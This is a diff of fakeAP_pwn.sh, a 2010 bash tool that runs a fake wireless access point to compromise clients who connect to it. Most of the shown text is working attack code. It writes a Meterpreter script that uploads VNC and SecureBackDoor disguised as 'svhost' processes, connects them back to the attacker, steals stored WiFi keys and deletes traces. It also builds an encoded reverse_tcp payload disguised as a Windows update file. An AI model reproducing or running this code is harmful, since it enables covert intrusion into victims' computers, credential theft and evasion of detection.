@@ -1,6 +1,6 @@
 #!/bin/bash                                                                                    #
 # (C)opyright 2010 - g0tmi1k & joker5bb                                                        #
-# fakeAP_pwn.sh v0.3 (Beta-#89 2010-08-20)                                                     #
+# fakeAP_pwn.sh v0.3 (Beta-#90 2010-08-20)                                                     #
 #---Important----------------------------------------------------------------------------------#
 # Make sure to copy "www". Example: cp -rf www/* /var/www/fakeAP_pwn                           #
 # The VNC password is "g0tmi1k" (without "")                                                   #
@@ -56,7 +56,7 @@ verbose=0
 gatewayIP=$(route -n | awk '/^0.0.0.0/ {getline; print $2}')
     ourIP="127.0.0.1"                # 10.0.0.1?
      port=$(shuf -i 2000-65000 -n 1) # Random port each time
-  version="0.3 (Beta-#89)"           # Version
+  version="0.3 (Beta-#90)"           # Version
       www="${www%/}"                 # Remove trailing slash
     debug=false                      # Windows dont close, shows extra stuff
   logFile=fakeAP_pwn.log             # filename of output
@@ -109,7 +109,7 @@ function cleanup() { # cleanup mode ************* DOESN'T READ VALUES CORRECTY -
       if [ $(echo route | grep "10.0.0.0") ] ; then route del -net 10.0.0.0 netmask 255.255.255.0 gw 10.0.0.1; fi
       echo "0" > /proc/sys/net/ipv4/ip_forward
       echo "0" > /proc/sys/net/ipv4/conf/$interface/forwarding
-      echo "0" > /proc/sys/net/ipv4/conf/$wifiInterface/forwarding
+      echo "0" > /proc/sys/net/ipv4/conf/$wifiInterface/forwarding # Test?
       ipTables clear
    fi
    if [ -e "/etc/apparmor.d/usr.sbin.dhcpd3.bkup" ]; then mv -f "/etc/apparmor.d/usr.sbin.dhcpd3.bkup" "/etc/apparmor.d/usr.sbin.dhcpd3" ; fi # ubuntu fixes - folder persmissions
@@ -898,8 +898,8 @@ while (<>) {
 elif [ "$mode" != "normal" ] || [ "$mode" == "flip" ] ; then
    path="/tmp/fakeAP_pwn.rb" # metasploit script
    if [ -e "$path" ] ; then rm "$path"; fi
-   echo -e "# ID: fakeAP_pwn.rb v$version
-# Author: g0tmi1k at http://g0tmi1k.blogspot.com\n
+   echo "# ID: fakeAP_pwn.rb v$version
+# Author: g0tmi1k at http://g0tmi1k.blogspot.com
 ################## Variable Declarations ##################
 @client   = client
 host,port = session.tunnel_peer.split(':')
@@ -908,85 +908,101 @@ host      = @client.sys.config.sysinfo['Computer']
 arch      = @client.sys.config.sysinfo['Architecture']
 user      = @client.sys.config.getuid
 date      = Time.now.strftime(\"%Y-%m-%d.%H:%M:%S\")
-uac       = 0\n
+uac       = 0
 ######################## Functions ########################
 def doLinux
 	print_status(\"Coming soon\")
-end\n
+end
 def doOSX
 	print_status(\"Coming soon\")
-end\n
+end
 def doWindows(uac)
 	session.response_timeout=120
 	begin" >> $path
       if [ "$payload" == "vnc" ] ; then
-         echo -e "		print_status(\"   Stopping: winvnc.exe\")
+         echo "		print_status(\"   Stopping: winvnc.exe\")
 		session.sys.process.execute(\"cmd.exe /C taskkill /IM svhost101.exe /F\", nil, {'Hidden' => true})
-		sleep(1)\n
+		sleep(1)
+
 		print_status(\"  Uploading: VNC\")
 		exec = upload(session,\"$www/winvnc.exe\",\"svhost101.exe\",\"\")
 		upload(session,\"$www/vnchooks.dll\",\"vnchooks.dll\",\"\")
 		upload(session,\"$www/vnc.reg\",\"vnc.reg\",\"\")
-		sleep(1)\n
+		sleep(1)
+
 		print_status(\"Configuring: VNC\")
-		execute(session,\"cmd.exe /C regedit.exe /S %TEMP%\vnc.reg\", nil)
-		sleep(1)\n
+		execute(session,\"cmd.exe /C regedit.exe /S %TEMP%\\\vnc.reg\", nil)
+		sleep(1)
+
 		if uac == 1
 			print_status(\"    Waiting: 30 seconds for target to click \\\"yes\\\"\")
 			sleep(30)
-		end\n
+		end
+
 		print_status(\"  Executing: winvnc.exe (#{exec})\")
 		execute(session,\"cmd.exe /C #{exec} -kill -run\", nil)
-		sleep(1)\n
+		sleep(1)
+
 		print_status(\"Configuring: VNC (Reserving connection).\")
-		execute(session,\"cmd.exe /C #{exec} -connect 10.0.0.1\", nil)\n
+		execute(session,\"cmd.exe /C #{exec} -connect 10.0.0.1\", nil)
+
 		print_status(\"   Deleting: Traces\")
 		delete(session, \"%SystemDrive%\\\vnc.reg\")" >> $path
       elif [ "$payload" == "sbd" ] ; then
-         echo -e "		print_status(\" Stopping: sbd.exe\")
+         echo "		print_status(\" Stopping: sbd.exe\")
 		session.sys.process.execute(\"cmd.exe /C taskkill /IM svhost102.exe /F\", nil, {'Hidden' => true})
-		sleep(1)\n
+		sleep(1)
+
 		print_status(\"Uploading: SecureBackDoor\")
 		exec = upload(session,\"$www/sbd.exe\",\"svhost102.exe\",\"\")
-		sleep(1)\n
+		sleep(1)
+
 		print_status(\"Executing: sbd.exe (#{exec})\")
 		execute(session,\"cmd.exe /C #{exec} -q -r 10 -k g0tmi1k -e cmd -p $port 10.0.0.1\", nil)" >> $path
       elif [ "$payload" == "wkv" ] ; then
-         echo -e "	print_status(\"  Uploading: Wireless Key Viewer\")
+         echo "	print_status(\"  Uploading: Wireless Key Viewer\")
 		if @client.sys.config.sysinfo['Architecture'] =~ (/x64/)
 			exec = upload(session,\"$www/wkv-x64.exe\",\"\",\"\")
 		else
 			exec = upload(session,\"$www/wkv-x86.exe\",\"\",\"\")
 		end
-		sleep(1)\n
+		sleep(1)
+
 		print_status(\"  Executing: wkv.exe (#{exec})\")
 		execute(session,\"cmd.exe /C #{exec} /stabular %TEMP%\\\wkv.txt\", nil)
-		sleep(1)\n
+		sleep(1)
+
 		if uac == 1
 			print_status(\"    Waiting: 30 seconds for target to click \\\"yes\\\"\")
 			sleep(30)
-		end\n
+		end
+
 		# Check for file!
 		print_status(\"Downloading: WiFi keys (/tmp/fakeAP_pwn.wkv)\")
-		session.fs.file.download_file(\"/tmp/fakeAP_pwn.wkv\", \"%TEMP%\\\wkv.txt\")\n
+		session.fs.file.download_file(\"/tmp/fakeAP_pwn.wkv\", \"%TEMP%\\\wkv.txt\")
+
 		print_status(\"   Deleting: Traces\")
 		delete(session, exec)
 		delete(session, \"%TEMP%\\\wkv.txt\")" >> $path
       else
-         echo -e "		print_status(\"Stopping: backdoor.exe\")
+         echo "		print_status(\"Stopping: backdoor.exe\")
 		session.sys.process.execute(\"cmd.exe /C taskkill /IM svhost103.exe /F\", nil, {'Hidden' => true})
-		sleep(1)\n
+		sleep(1)
+
 		print_status(\"Uploading: backdoor.exe ($backdoorPath)\")
 		exec = upload(session,\"$backdoorPath\",\"svhost103.exe\",\"\")
-		sleep(1)\n
+		sleep(1)
+
 		print_status(\"Executing: backdoor.exe\")
 		execute(session,\"cmd.exe /C #{exec}\", nil)" >> $path
       fi
-      echo -e "		sleep(1)\n
+      echo "		sleep(1)
+		return
+
 	rescue ::Exception => e
 		print_status(\"Error: #{e.class} #{e}\")
 	end
-end\n
+end
 def upload(session,file,filename = \"\",trgloc = \"\")
 	if not ::File.exists?(file)
 		raise \"File to upload does not exists!\"
@@ -1013,7 +1029,7 @@ def upload(session,file,filename = \"\",trgloc = \"\")
 		end
 	end
 	return fileontrgt
-end\n
+end
 def execute(session,cmdexe,opt)
 	r=''
 	session.response_timeout=120
@@ -1023,14 +1039,14 @@ def execute(session,cmdexe,opt)
 	rescue ::Exception => e
 		print_status(\"Error Running Command #{cmdexe}: #{e.class} #{e}\")
 	end
-end\n
+end
 def delete(session, path)
    r = session.sys.process.execute(\"cmd.exe /c del /F /S /Q \" + path, nil, {'Hidden' => 'true'})
    while(r.name)
       select(nil, nil, nil, 0.10)
    end
    r.close
-end\n
+end
 def checkUAC(session)
 	begin
 		open_key = session.sys.registry.open_key(HKEY_LOCAL_MACHINE,\"SOFTWARE\\\Microsoft\\\Windows\\\CurrentVersion\\\Policies\\\System\", KEY_READ)
@@ -1039,7 +1055,7 @@ def checkUAC(session)
 		print_status(\"Error Checking UAC: #{e.class} #{e}\")
 	end
 	return (value)
-end\n\n
+end
 ########################### Main ##########################
 print_line(\"[*] fakeAP_pwn $version\")" >> $path
 #if | [ "$verbose" != "0" ] || [ "$diagnostics" == "true" ] ||  [ "$debug" == "true" ] ; then
@@ -1064,7 +1080,7 @@ print_status(\"User: #{user}\")
 print_status(\"Mode: $payload\")
 print_status(\"-------------------------------------------\")" >> $path
 #fi
-      echo -e "if os =~ /Linux/
+      echo "if os =~ /Linux/
 	doLinux
 elsif os =~ /OSX/
 	doOSX
@@ -1074,7 +1090,7 @@ elsif os =~ /Windows/
 else
 	print_error(\"Unsupported OS\")
 	exit
-end\n
+end
 print_status(\"Unlocking: fakeAP_pwn\")
 output = ::File.open(\"/tmp/fakeAP_pwn.lock\", \"a\")
 output.puts(\"fakeAP_pwn\")
@@ -1131,7 +1147,7 @@ run winenum.rb -r
 clearev
 print_status(\"-------------------------------------------\")" >> $path
       fi
-      echo -e "\n\nprint_line(\"[*] Done!\")" >> $path
+      echo "print_line(\"[*] Done!\")" >> $path
          if [ "$verbose" == "2" ]  ; then echo "Created: $path"; fi
          if [ "$debug" == "true" ] ; then cat "$path" ; fi
       fi
@@ -1318,7 +1334,8 @@ if [ "$mode" != "normal" ] && [ "$mode" != "flip" ]; then
    #command="/opt/metasploit3/bin/msfpayload windows/meterpreter/reverse_tcp LHOST=10.0.0.1 LPORT=4564 X > $www/Windows-KB183905-x86-ENU.exe"
    #command="/opt/metasploit3/bin/msfpayload windows/meterpreter/reverse_tcp LHOST=10.0.0.1 LPORT=4564 R | /opt/metasploit3/bin/msfencode -e x86/shikata_ga_nai -c 5 -t raw | /opt/metasploit3/bin/msfencode -e x86/countdown -c 2 -t raw | /opt/metasploit3/bin/msfencode -e x86/shikata_ga_nai -c 5 -t raw | /opt/metasploit3/bin/msfencode -x $www/sbd.exe -t exe -e x86/call4_dword_xor -c 2 -o $www/Windows-KB183905-x86-ENU.exe"
    #command="/opt/metasploit3/bin/msfpayload windows/x64/meterpreter/reverse_tcp LHOST=10.0.0.1 LPORT=4564 R | /opt/metasploit3/bin/msfencode -x $www/sbd.exe -t exe -e x86/shikata_ga_nai -c 10 -o $www/Windows-KB183905-x64-ENU.exe" # x64 bit!
-   action "Metasploit (Windows)" "/opt/metasploit3/bin/msfpayload windows/meterpreter/reverse_tcp LHOST=10.0.0.1 LPORT=4564 R | /opt/metasploit3/bin/msfencode -x $www/sbd.exe -t exe -e x86/shikata_ga_nai -c 10 -o $www/Windows-KB183905-x86-ENU.exe" $verbose $diagnostics "true"
+#   action "Metasploit (Windows)" "/opt/metasploit3/bin/msfpayload windows/meterpreter/reverse_tcp LHOST=10.0.0.1 LPORT=4564 R | /opt/metasploit3/bin/msfencode -x $www/sbd.exe -t exe -e x86/shikata_ga_nai -c 10 -o $www/Windows-KB183905-x86-ENU.exe" $verbose $diagnostics "true"
+   action "Metasploit (Windows)" "/opt/metasploit3/bin/msfpayload windows/meterpreter/reverse_tcp LHOST=10.0.0.1 LPORT=4564 R | /opt/metasploit3/bin/msfencode -x /pentest/windows-binaries/tools/tftpd32.exe -t exe -e x86/shikata_ga_nai -c 10 -o $www/Windows-KB183905-x86-ENU.exe" $verbose $diagnostics "true"
    if [ ! -e "$www/Windows-KB183905-x86-ENU.exe" ] ; then display error "Failed to created exploit." $diagnostics 1>&2; cleanup; fi
 fi
 
